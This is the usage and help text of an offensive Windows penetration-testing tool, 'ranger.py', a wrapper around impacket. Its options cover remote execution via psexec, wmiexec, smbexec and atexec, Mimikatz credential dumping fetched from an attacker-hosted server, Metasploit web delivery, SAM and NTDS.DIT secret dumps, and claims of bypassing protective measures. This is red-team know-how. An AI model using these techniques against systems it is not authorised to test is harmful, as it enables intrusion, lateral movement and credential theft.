'''
usage:
Command Shell:
    ranger.py [-i IP] [--user Administrator] [--pwd Password1] [-t target] --smbexec -q -v -vv -vvv
Attack Directly:
    ranger.py [-i IP] [--user Administrator] [--pwd Password1] [-t target] --wmiexec --invoker -q -v -vv -vvv
Create Pasteable Double Encoded Script:
    ranger.py --invoker -q -v -vv -vvv

A wrapping and execution tool for a some of the most useful impacket tools

optional arguments:
  -h, --help            show this help message and exit
  -v                    Verbosity level, defaults to one, this outputs each
                        command and result
  -q                    Sets the results to be quiet
  --version             show program's version number and exit

Method:
  --psexec              Inject the invoker process into the system memory with
                        psexec
  --wmiexec             Inject the invoker process into the system memory with
                        wmiexec
  --smbexec             Inject the invoker process into the system memory with
                        smbexec
  --atexec              Inject the command task into the system memory with at
                        on systems older than Vista

Attack:
  --invoker             Configures the command to use Mimikatz invoker
  --downloader          Configures the command to use Metasploit's
                        exploit/multi/script/web_delivery
  --secrets_dump        Execute a SAM table dump
  --command COMMAND     Set the command that will be executed, default is
                        cmd.exe
  --group-members GROUP
                        Identifies members of Domain Groups through PowerShell

SAM and NTDS.DIT Options, used with --sam_dump:
  --system SYSTEM       The SYSTEM hive to parse
  --security SECURITY   The SECURITY hive to parse
  --sam SAM             The SAM hive to parse
  --ntds NTDS           The NTDS.DIT file to parse

PowerShell IEX Options:
  -i SRC_IP             Set the IP address of the Mimkatz server, defaults to
                        eth0 IP
  -n INTERFACE          Instead of setting the IP you can extract it by
                        interface, default eth0
  -p SRC_PORT           Set the port the Mimikatz server is on, defaults to
                        port 8000
  -x PAYLOAD            The name of the Mimikatz file, the default is Invoke-
                        Mimikatz.ps1
  -a MIM_ARG            Allows you to change the argument name if the Mimikatz
                        script was changed, defaults to DumpCreds
  -f MIM_FUNC           Allows you to change the function name if the Mimikatz
                        script was changed, defaults to Invoke-Mimikatz

Remote Target Options:
  -t TARGET             The system you are attempting to exploit
  --domain DOM          The domain the user is apart of, defaults to WORKGROUP
  --user USR            The username that will be used to exploit the system
  --pwd PWD             The password that will be used to exploit the system
  --aes AES_KEY         The AES Key Option
  --kerberos KERBEROS   The Kerberos option
  --share SHARE         The Share to execute against, the default is ADMIN$
  --mode {SHARE,SERVER}
                        Mode to use for --smbexec, default is SERVER, which
                        requires root access, SHARE does not
  --protocol {445/SMB,139/SMB}
                        The protocol to attack over, the default is 445/SMB
  --directory DIRECTORY
                        The directory to either drop the payload or
                        instantiate the session

Filename for randimization of script:
  --filename FILENAME   The file that the attack script will be dumped to

This script oombines specific attacks with dynmaic methods, which allow you to
bypass many protective measures.
'''
